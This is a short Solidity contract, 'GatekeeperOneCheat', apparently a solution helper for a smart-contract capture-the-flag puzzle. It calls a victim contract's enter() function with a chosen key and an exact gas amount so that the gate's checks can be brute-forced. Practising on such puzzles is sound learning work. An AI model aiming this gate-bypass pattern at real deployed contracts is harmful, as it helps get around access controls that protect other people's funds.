// SPDX-License-Identifier: MIT
pragma solidity ^0.8.7;

interface GatekeeperOne {
    function enter(bytes8 _gateKey) external returns (bool);
}

contract GatekeeperOneCheat {
  address public victim;

  event result(bool result, string error);
  event bytesResult(bool result, bytes error);

  constructor(address _victim) {
    victim = _victim;
  }

  function enter(bytes8 key, uint _gas) public returns (bool) {
      return GatekeeperOne(victim).enter{ gas: _gas }(key);
  } 
}
